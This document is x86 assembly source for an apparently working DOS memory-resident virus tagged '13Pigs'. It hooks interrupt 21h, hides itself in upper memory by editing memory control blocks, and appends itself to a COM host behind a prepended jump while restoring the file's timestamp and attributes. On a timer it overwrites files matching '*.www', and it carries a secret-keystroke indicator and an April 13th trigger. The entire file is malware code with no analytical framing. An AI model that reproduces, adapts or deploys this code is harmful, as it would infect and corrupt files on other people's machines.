; Resident on 21h, adds 'V' to all *.www files in current directory
;  Errors on use of the DIR commmand durring the infections, and other
;  int21 function.

.286
dosseg
.model tiny
.stack   28h
.data
.code

Interrupt EQU 21h
Busy      EQU 1
NotBusy   EQU 0
Time      EQU 10   ; Infection Time

jmp install_in_file

add_to_file:

        ; *** Mem Installation

        push    ds      ; set up segments
        push    es

        mov     ah,35h  ; get current int 8h add
        mov     al,Interrupt
        int     21h
        mov     di,bx

        call    base    ; find relative add of the new int
        base:   pop dx
        mov     bx,dx
        add     dx,offset inter - offset base

        add     bx,offset OldAdr - offset base ; Memorize int header
        mov     word ptr cs:[bx],di
        mov     word ptr cs:[bx][2],es

        mov     si, dx  ; see if the virii is in yet
        mov     bp, dx  ; save for future
        mov     cx, offset e_inter - offset inter
        cld
        rep     cmpsb
        je      quit

        mov     ax,cs           ; Get mem :
        dec     ax
        mov     ds,ax           ; ds = MCB
        mov     cx,(offset e_inter - offset inter+15)/16+1
        sub     ds:[3],cl       ; still some memory
        mov     byte ptr ds:[0],'Z'     ; Mark host's MCB as the last in chain
        sub     word ptr ds:[12h],(offset e_inter - offset inter+15)/16+1
        mov     bx,ds:[3]       ; Get free high mem block adress
        stc
        adc     bx,ax
        mov     ds,bx
        inc     bx
        mov     es,bx
        mov     byte ptr ds:[0],'Z'     ; Mark Virri's MCB as the last one in chain
        mov     word ptr ds:[1],8       ; Set dos as the owner
        mov     word ptr ds:[3],(offset e_inter - offset inter+15)/16 ; Set parag size of the virri

        mov     ax,cs   ; Move Virri to its new location
        mov     ds,ax
        mov     di,0
        mov     dx,bp
        mov     si,dx
        mov     cx,offset e_inter - offset inter
        cld
        rep     movsb

        mov     ax,es   ; set up new int pointer
        mov     ds,ax
        mov     dx,0
        mov     ah,25h
        mov     al,Interrupt
        int     21h

        quit:

        pop     es      ; bring back original segments
        pop     ds


        ; *** DisPatcher :

        call    offs   ; new relative adrs
offs:   pop     bx

        add      bx,offset jmpdata - offset offs
        mov      al,cs:[bx]
        mov      cs:[100h],al
        mov      al,cs:[bx][1]
        mov      cs:[101h],al
        mov      al,cs:[bx][2]
        mov      cs:[102h],al

        mov      ax,0100h       ; Jump back to the program
        push     ax
        ret
        jmpdata  db 0,0,0       ; Stores 3 bytes of the file

        ; *** New Interrupt:

inter:
        ; Don't Iret, just far jump to old interrupt
        ; iret
        jmp overbusy
            Busy_Variable db NotBusy
        overbusy:
        pushf
 cli
        push ds
        push es
        push ax
        push dx
        push cx
        push bp
        pusha

        mov al,cs:[3]
        cmp al,Busy
        jne ok0
        jmp finish              ; I'm busy infecting files

        ok0:
        mov     ax,0b800h       ; Text Screen
        mov     es,ax

        mov     ah,2            ; Try to infect a file every minute
cli
        int     1ah
cli
        cmp     dh,Time
        jb      ok1
        ;je      ok1
        jmp     Check_Key

        ok1:
        ; Infection :
        mov     al,Busy            ; Set variable BUSY to 1
        mov     cs:[3],al

        call    Find_File
Find_File:
        pop     dx
        add     dx,offset files - offset Find_File

        mov     ax,cs           ; Find First *.com File in current Dir:
        mov     ds,ax
        mov     cx,111b         ; Set File Attributes of the good files
        mov     ah,4eh
cli
        int     21h
cli
        jnc     TryITL    ; No files found

        mov     al,NotBusy            ; Set variable BUSY to 0 (not)
        mov     cs:[3],al
        jmp     finish

        ; Get the File's Name
TryITL:
        mov    ah,2fh
cli
        int    21h
cli
        mov    dx,es
        mov    ds,dx
        mov    dx,bx
        add    dx,1eh

        ; Open and see if infected
        mov    ax,3d02h
cli
        int    21h
cli
        jnc     ok

        mov     al,NotBusy            ; Set variable BUSY to 0 (not)
        mov     cs:[3],al
        jmp     finish

ok:     mov    bx,ax
        mov    ax,cs            ; Get back our DS
        mov    ds,ax

; This will need to be changed :

mov     ax,4202h            ; go to the end of thge file
xor     cx,cx
xor     dx,dx
cli
int     21h
cli

cmp     ax,6                ; Size after the infection
jne     Infect_File

; Close current file and try to get another :
mov     ah,3eh
cli
int     21h
cli

mov     ah,4fh
cli
int     21h
cli
jnc     TryITL              ; No more files found, finish

mov     al,NotBusy            ; Set variable BUSY to 0 (not)
mov     cs:[3],al
jmp     finish

Infect_File:

Call Find_Buff
Find_Buff: pop dx

add     dx,offset buff - offset Find_Buff
mov     ax,4000h        ;write jmp vir at the begining of file
mov     cx,1
cli
int     21h
cli

mov     ah,3eh
cli
int     21h
cli

        mov     al,NotBusy            ; Set variable BUSY to 0 (not)
        mov     cs:[3],al
        jmp     finish

Check_Key:
        mov     ah,2            ; check keyboard for Shft + Shft + CapsLock
cli
        int     16h
cli
        and     al,01000011b
        cmp     al,01000011b
        jne     Check_Date

        mov     al,':'          ; Show up to master :
        mov     es:[156],al
        mov     al,2
        mov     es:[157],al
        mov     al,'0'
        mov     es:[158],al
        mov     al,4
        mov     es:[159],al
        jmp     finish

Check_Date:
        mov     ah,4h  ;       Check if April 13th
cli
        int     1ah
cli
        cmp     dh,4   ;       Month
        jne     finish
        cmp     dl,13h ;       Date
        jb      finish

        ; 4/13+:
        mov     al,':'
        mov     es:[156],al
        mov     al,2
        mov     es:[157],al
        mov     al,'('
        mov     es:[158],al
        mov     al,4
        mov     es:[159],al

finish:

        popa
        pop     bp
        pop     cx
        pop     dx
        pop     ax
        pop     es
        pop     ds
        popf
        JmpHead db   0EAh
        OldAdr  dw   0,0

        ID      db   '13Pigs'
        files   db   '*.www',0
        buff    db   'V'
e_inter:

e_add_to_file:

        ; *** File installator :

        file    db 'c.com',0
        data2   db 0E9h,0,0

install_in_file:

        mov     ax,cs  ; Set up segments
        mov     ds,ax

        mov     dx,offset file

        mov     ax,4300h        ; get file attributes

        int     21h
        mov     bp,cx

        mov     cx,0            ; set new attributes
        mov     ax,4301h
        int     21h

        mov     ax,3d02h        ;open file
        int     21h
        jc      error
        mov     bx,ax

        mov     ax,5700h        ; get time / date
        int     21h
        mov     si,cx
        mov     di,dx

        mov     dx,offset jmpdata   ;read first 3 bytes to cs:data
        mov     cx,3
        mov     ah,3fh
        int     21h
        jc      error

        mov     ax,4202h            ; go to the end of the file
        xor     cx,cx
        xor     dx,dx
        int     21h
        jc      error

        mov     dx,ax   ; Check if the file is infected already :
        sub     dx, offset e_add_to_file - offset add_to_file+ 3
        cmp     word ptr [jmpdata + 1], dx
        je      nextfile

        sub     ax,3                  ; Set up new jmp, which will go in front
        mov     cs:[data2+1],al
        mov     cs:[data2+2],ah

        mov     dx,offset add_to_file ; save addtofile to end of file
        mov     cx,offset e_add_to_file-offset add_to_file
        mov     ax,4000h
        int     21h
        jc      error

        mov     ax,4200h        ; Move back to start
        xor     cx,cx
        xor     dx,dx
        int     21h
        jc      error

        mov     ax,4000h        ;write jmp vir at the begining of file
        mov     cx,3
        lea     dx,data2
        int     21h
        jc      error

        mov     ax,5701h        ; set time / date back
        mov     cx,si
        mov     dx,di
        int     21h

        mov     ah,3eh              ; close file
        int     21h
        jc      exit

        mov     dx,offset file      ; bring back file attributes
        mov     cx,bp
        mov     ax,4301h
        int     21h

jmp exit

nextfile:
error:
        mov     ah,3eh               ; Close file
        int     21h
exit:   mov     ah,4ch               ; terminate the program
        int     21h

end INSTALL_in_file